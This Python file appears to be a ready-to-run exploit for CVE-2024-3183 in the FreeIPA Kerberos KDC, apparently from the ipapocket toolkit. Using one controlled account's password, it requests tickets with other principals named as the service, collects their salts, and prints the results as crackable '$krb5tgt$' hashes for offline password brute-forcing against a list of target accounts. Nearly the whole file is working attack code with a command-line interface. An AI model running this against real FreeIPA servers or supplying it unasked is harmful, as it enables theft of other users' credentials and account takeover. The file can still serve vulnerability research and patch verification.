import logging
import argparse
import sys
import secrets
from ipapocket.utils import logger
from ipapocket.exceptions.exceptions import UnexpectedKerberosError
from ipapocket.krb5.objects import *
from ipapocket.krb5.constants import *
from ipapocket.krb5.operations import BaseKrb5Operations
from ipapocket.network.krb5 import Krb5Client
from datetime import datetime, timedelta, timezone
from ipapocket.krb5.crypto import crypto
from ipapocket.krb5.crypto.base import Key, _get_etype_profile
from ipapocket.exceptions.exceptions import NoSupportedEtypes
from binascii import hexlify


class Storage:
    _etype: EncryptionTypes = None
    _salt: str = None
    _cipher: str = None

    def __init__(self, etype = None, salt = None):
        self.etype = etype
        self.salt = salt

    @property
    def etype(self) -> EncryptionTypes:
        return self._etype

    @etype.setter
    def etype(self, value) -> None:
        self._etype = value

    @property
    def salt(self) -> str:
        return self._salt

    @salt.setter
    def salt(self, value) -> None:
        self._salt = value

    @property
    def cipher(self) -> str:
        return self._cipher

    @cipher.setter
    def cipher(self, value) -> None:
        self._cipher = value


class KrbAsReqCustom:
    _domain: str = None

    def __init__(self, domain):
        self._domain = domain

    def as_req_without_pa(self, username, etype) -> AsReq:
        """
        Construct AS-REQ packet without encrypted Preauthentication Data
        """
        current_timestamp = datetime.now(timezone.utc)
        # generate nonce
        nonce = UInt32(secrets.randbits(31))

        # need uppercase domain name
        domain = self._domain.upper()
        # cname (upn)
        cname = PrincipalName(PrincipalType.NT_PRINCIPAL, username)
        # realm
        realm = Realm(domain)
        # sname
        sname = PrincipalName(PrincipalType.NT_SRV_INST, ["krbtgt", domain])

        # KDC request body
        kdc_req_body = KdcReqBody()
        # KDC options (flags)
        kdc_options = KdcOptions()
        kdc_options.add(KdcOptionsTypes.FORWARDABLE)
        kdc_options.add(KdcOptionsTypes.CANONICALIZE)
        kdc_options.add(KdcOptionsTypes.RENEWABLE_OK)

        # create timestamps
        till = KerberosTime(current_timestamp + timedelta(days=1))
        rtime = KerberosTime(current_timestamp + timedelta(days=1))

        # set kdc options in body
        kdc_req_body.kdc_options = kdc_options
        # set cname in body
        kdc_req_body.cname = cname
        # set realm in body
        kdc_req_body.realm = realm
        # set sname in body
        kdc_req_body.sname = sname
        # set till timestamp in body
        kdc_req_body.till = till
        # set rtime timestamp in body
        kdc_req_body.rtime = rtime
        # set nonce in body
        kdc_req_body.nonce = nonce
        # set etype in body
        kdc_req_body.etype = EncTypes(etype)

        # create KDC request
        kdc_req = KdcReq()

        # set version
        kdc_req.pvno = KRB5_VERSION
        # add request body
        kdc_req.req_body = kdc_req_body
        # add message type
        kdc_req.msg_type = MessageTypes.KRB_AS_REQ

        # create AS-REQ
        as_req = AsReq(kdc_req)

        return as_req

    def as_req_with_pa(
        self, controlled_username: str, target_username: str, key: Key
    ) -> AsReq:
        """
        Construct AS-REQ packet with encrypted Preauthentication Data
        """
        current_timestamp = datetime.now(timezone.utc)
        # generate nonce
        nonce = UInt32(secrets.randbits(31))

        # we need uppercase domain
        domain = self._domain.upper()
        # create cname
        cname = PrincipalName(PrincipalType.NT_PRINCIPAL, controlled_username)
        # create realm
        realm = Realm(domain)
        # create sname
        sname = PrincipalName(PrincipalType.NT_SRV_INST, target_username)

        # create KDC request body
        kdc_req_body = KdcReqBody()

        # create KDC options
        kdc_options = KdcOptions()
        kdc_options.add(KdcOptionsTypes.FORWARDABLE)
        kdc_options.add(KdcOptionsTypes.CANONICALIZE)
        kdc_options.add(KdcOptionsTypes.RENEWABLE_OK)

        # generate timestamps for validatity of TGT
        till = KerberosTime(current_timestamp + timedelta(days=1))
        rtime = KerberosTime(current_timestamp + timedelta(days=1))

        # set options in request
        kdc_req_body.kdc_options = kdc_options
        # set cname in request
        kdc_req_body.cname = cname
        # set realm in request
        kdc_req_body.realm = realm
        # set sname in request
        kdc_req_body.sname = sname
        # set till in request
        kdc_req_body.till = till
        # set rtime in request
        kdc_req_body.rtime = rtime
        # set nonce in request
        kdc_req_body.nonce = nonce

        # set etype in request
        kdc_req_body.etype = EncTypes(key.enctype)

        # create KDC request
        kdc_req = KdcReq()

        # create encrypted PA-DATA
        pa_datas = MethodData()
        pa_enc_ts = PaEncTsEnc(current_timestamp, current_timestamp.microsecond)

        enc_ts = _get_etype_profile(key.enctype).encrypt(
            key,
            KeyUsageTypes.AS_REQ_PA_ENC_TIMESTAMP.value,
            pa_enc_ts.to_asn1().dump(),
            None,
        )
        pa_datas.add(
            PaData(
                PreAuthenticationDataTypes.PA_ENC_TIMESTAMP,
                EncryptedData(key.enctype, KRB5_VERSION, enc_ts),
            )
        )

        # add version of kerberos
        kdc_req.pvno = KRB5_VERSION
        # add KDC requst body
        kdc_req.req_body = kdc_req_body
        # add message type
        kdc_req.msg_type = MessageTypes.KRB_AS_REQ
        # add pa data
        kdc_req.padata = pa_datas

        # create AS-REQ
        as_req = AsReq(kdc_req)
        return as_req

    def as_req_etype_salt(self, error: KrbError):
        """
        Iterate over array of proposed PA types from weak to strong
        """
        for padata in MethodData.load(error.e_data).padatas:
            # from https://www.rfc-editor.org/rfc/rfc4120#section-5.2.7.5 - might be ONLY ONE ETYPE-ENTRY in sequence of each
            if padata.type == PreAuthenticationDataTypes.PA_ETYPE_INFO:
                etypes = EtypeInfo.load(padata.value)
                for etype in etypes._entries:
                    if etype.etype in crypto.supported_enctypes():
                        logging.debug(
                            "server support ETYPE-INFO with etype {} and salt {}".format(
                                etype.etype.name, etype.salt
                            )
                        )
                        # suppose that salt can't be null in this case
                        return etype.etype, etype.salt
            if padata.type == PreAuthenticationDataTypes.PA_ETYPE_INFO2:
                etypes2 = EtypeInfo2.load(padata.value)
                for etype2 in etypes2._entries:
                    if etype2.etype in crypto.supported_enctypes():
                        logging.debug(
                            "server support ETYPE-INFO2 with etype {} and salt {}".format(
                                etype2.etype.name, etype2.salt.to_asn1().native
                            )
                        )
                        # suppose that salt can't be null in this case
                        return etype2.etype, etype2.salt.to_asn1().native.encode()
        raise NoSupportedEtypes("no supported server PA etypes exists in this client")


class Cve_2024_3183:
    _base: BaseKrb5Operations = None
    _username: str = None
    _password: str = None
    _domain: str = None
    _ipa_host: str = None
    _target_principals: list[str] = None
    _storage: dict[str, Storage] = None
    _krb5client: Krb5Client = None
    _key: Key = None

    def __init__(self, username, password, domain, ipa_host, principals):
        self._base = BaseKrb5Operations(username, domain)
        self._username = username
        self._password = password
        self._domain = domain
        self._ipa_host = ipa_host
        self._target_principals = principals
        self._storage = dict[str, Storage]()
        self._krb5client = Krb5Client(ipa_host)
        self._krb_custom = KrbAsReqCustom(domain)

    def get_salts(self):
        logging.info("get etype and salt for target principals...")
        for v in self._target_principals:
            logging.debug("get etype and salt for principal {}".format(v))
            response = KerberosResponse.load(
                self._krb5client.sendrcv(
                    self._krb_custom.as_req_without_pa(v, self._storage[v].etype).to_asn1().dump()
                )
            )
            if not response.is_krb_error():
                logging.warn("user {} has no PREAUTH, skipping...".format(v))
                pass
            else:
                error = response.krb_error
                if error.error_code != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED:
                    logging.debug(
                        "error {} while process request for user {}".format(
                            error.error_code.name, v
                        )
                    )
                else:
                    # extract etype and salt
                    try:
                        _, salt = self._krb_custom.as_req_etype_salt(error)
                        self._storage[v].salt = salt
                    except Exception as e:
                        logging.debug(
                            "unable get preferred etype for user {}: {}".format(v, e)
                        )

    def get_base(self) -> bool:
        logging.info("get etypa and salt for controller principal")
        logging.debug(
            "create AS-REQ without PA for controlled user {}".format(self._username)
        )
        response = KerberosResponse.load(
            self._krb5client.sendrcv(
                self._krb_custom.as_req_without_pa(self._username, crypto.supported_enctypes()).to_asn1().dump()
            )
        )
        if not response.is_krb_error():
            logging.error(
                "controlled principal {} has no PREAUTH, unable process".format(
                    self._username
                )
            )
            return False
        else:
            error = response.krb_error
            if error.error_code != ErrorCodes.KDC_ERR_PREAUTH_REQUIRED:
                logging.error(
                    "unexpected KRB error type {}".format(error.error_code.name)
                )
                return False
            else:
                etype, salt = self._krb_custom.as_req_etype_salt(error)
                self._key = crypto.string_to_key(etype, self._password, salt)
                return True

    def get_tickets(self):
        logging.info("get tickets using target principals as service names")
        for k in self._target_principals:
            response = KerberosResponse.load(
                self._krb5client.sendrcv(
                    self._krb_custom.as_req_with_pa(self._username, k, self._key)
                    .to_asn1()
                    .dump()
                )
            )
            if response.is_krb_error():
                if response.krb_error.error_code == ErrorCodes.KDC_ERR_PREAUTH_FAILED:
                    raise Exception(
                        "invalid credentials supplied for controlled principal {}".format(
                            self._username
                        )
                    )
                else:
                    logging.debug(
                        "unexpected KRB error {} in AS-REQ with service name {}".format(
                            response.krb_error.error_code.name, k
                        )
                    )
            else:
                # save ciphertext of ticket
                self._storage[k] = Storage()
                self._storage[k].cipher = response.as_rep.kdc_rep.ticket.enc_part.cipher
                self._storage[k].etype = response.as_rep.kdc_rep.ticket.enc_part.etype

    def output_hashes(self):
        """
        Hashes in format:
        $krb5tgt$etype$service$salt$checksum$ticket
        """
        logging.info("print hashes")
        for k, v in self._storage.items():
            # get ciphertext and mac
            c, h = _get_etype_profile(v.etype).splitter(v.cipher)
            entry = "$krb5tgt$%d$%s$%s$%s$%s" % (
                v.etype.value,
                k,
                hexlify(v.salt).decode(),
                hexlify(h).decode(),
                hexlify(c).decode(),
            )
            print(entry)

    def exploit(self):
        """
        This realization of CVE-2024-3183 targeting abuse of TGT (not TGS).
        1. We need to get salt for target principal, which hash we want crack;
        2. We need to get valid TGT response with ticket, encrypted by targeting principal's secret;
        3. Combine of salt + encrypted ticket will get possibility for brute-force attach.
        """
        # get etype and salt for controlled principal
        if not self.get_base():
            sys.exit(1)
        # get ticket for all principals in storage
        try:
            self.get_tickets()
        except Exception as e:
            logging.error("{}".format(e))
            sys.exit(1)
        # get etypes and salts for each targeting principal
        self.get_salts()
        # create output hashes for all processed principals
        self.output_hashes()


if __name__ == "__main__":
    logger.init()
    parser = argparse.ArgumentParser(add_help=True, description="CVE-2024-3183")
    parser.add_argument(
        "-u",
        "--username",
        required=True,
        action="store",
        help="Username of controlled principal",
    )
    parser.add_argument(
        "-p",
        "--password",
        required=True,
        action="store",
        help="Password of controlled principal",
    )
    parser.add_argument(
        "-d",
        "--domain",
        required=True,
        action="store",
        help="Domain name, e.g. ipa.test",
    )
    parser.add_argument(
        "-H",
        "--ipa-host",
        required=True,
        action="store",
        help="IP address or FQDN of FreeIPA KDC",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        required=False,
        action="store_true",
        help="Verbose mode",
    )
    parser.add_argument(
        "-t",
        "--targets",
        required=True,
        action="store",
        help="Path to file with target principals",
    )

    options = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    with open(options.targets, "r") as f:
        principals = f.read().splitlines()

    cve = Cve_2024_3183(
        options.username,
        options.password,
        options.domain,
        options.ipa_host,
        principals,
    )
    try:
        cve.exploit()
    except UnexpectedKerberosError as e:
        print(e)
